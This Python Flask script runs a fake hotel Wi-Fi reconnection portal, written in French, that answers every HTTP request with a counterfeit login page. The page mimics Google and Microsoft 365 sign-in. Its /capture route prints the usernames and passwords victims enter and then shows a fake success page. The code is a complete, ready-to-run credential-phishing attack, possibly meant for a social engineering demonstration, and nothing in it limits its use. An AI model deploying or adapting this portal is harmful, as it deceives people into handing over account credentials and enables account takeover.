from flask import Flask, render_template_string, request

app = Flask(__name__)

FAKE_SSO_PORTAL = '''
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Hôtel - Reconnexion Requise</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f3f4f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; border-top: 4px solid #ef4444; }
        .logo { font-size: 22px; font-weight: bold; color: #1e3a8a; margin-bottom: 5px; }
        .alert-box { background: #fee2e2; color: #991b1b; padding: 10px; border-radius: 4px; font-size: 0.85em; margin: 15px 0; text-align: left; font-weight: 500; }
        .separator { margin: 20px 0; border-bottom: 1px solid #e5e7eb; position: relative; }
        .separator span { background: white; padding: 0 10px; position: absolute; top: -10px; left: 25%; color: #6b7280; font-size: 0.85em; }
        .btn-sso { display: flex; align-items: center; justify-content: center; width: 100%; padding: 11px; margin: 10px 0; border: 1px solid #d1d5db; border-radius: 4px; background: white; cursor: pointer; font-weight: 500; font-size: 14px; }
        .form-group { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 0.85em; color: #374151; margin-bottom: 5px; }
        input { width: 100%; padding: 10px; border: 1px solid #d1d5db; border-radius: 4px; box-sizing: border-box; }
        .btn-submit { width: 100%; padding: 12px; background: #1e3a8a; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Hôtel Premium Connect</div>
        
        <div class="alert-box">
            ⚠️ <b>Session Wi-Fi interrompue</b><br>
            Vous avez été déconnecté suite à une mise à jour de la borne de votre étage. Veuillez vous réauthentifier.
        </div>
        
        <p style="color: #4b5563; font-size: 0.85em; margin-bottom: 20px;">Utilisez vos accès tiers pour une reconnexion instantanée :</p>
        
        <button class="btn-sso" onclick="showForm('Google')">🌐 Se connecter avec Google</button>
        <button class="btn-sso" onclick="showForm('Office 365')">💻 Se connecter avec Microsoft 365</button>

        <div class="separator"><span>ou identifiants de la chambre</span></div>

        <form action="/capture" method="post" id="loginForm">
            <div class="form-group">
                <label id="userLabel" for="username">Adresse email ou Identifiant</label>
                <input type="text" id="username" name="username" placeholder="exemple@domaine.com" required>
            </div>
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" name="password" placeholder="••••••••" required>
            </div>
            <button type="submit" class="btn-submit">S'authentifier et rétablir le flux</button>
        </form>
    </div>

    <script>
        function showForm(provider) {
            document.getElementById('userLabel').innerText = "Identifiant de compte " + provider;
            document.getElementById('username').placeholder = "votre-compte@" + (provider.toLowerCase().replace(' ', '')) + ".com";
            document.getElementById('username').focus();
        }
    </script>
</body>
</html>
'''

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    # Interception de l'ensemble du trafic HTTP non sécurisé pour afficher le faux portail
    return render_template_string(FAKE_SSO_PORTAL)

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Sortie console pour matérialiser l'interception le jour J
    print(f"\n\033[91m[!] ALERTE INGENIERIE SOCIALE : IDENTIFIANTS COMPTE TIERS INTERCEPTÉS !\033[0m")
    print(f"    Compte ciblé : {username}")
    print(f"    Mot de passe : {password}\n")
    
    return """
    <div style="text-align:center; padding-top:100px; font-family:sans-serif;">
        <h2 style="color:#22c55e;">Authentification réussie</h2>
        <p>Votre terminal a été réassocié à la borne. Redirection en cours...</p>
    </div>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)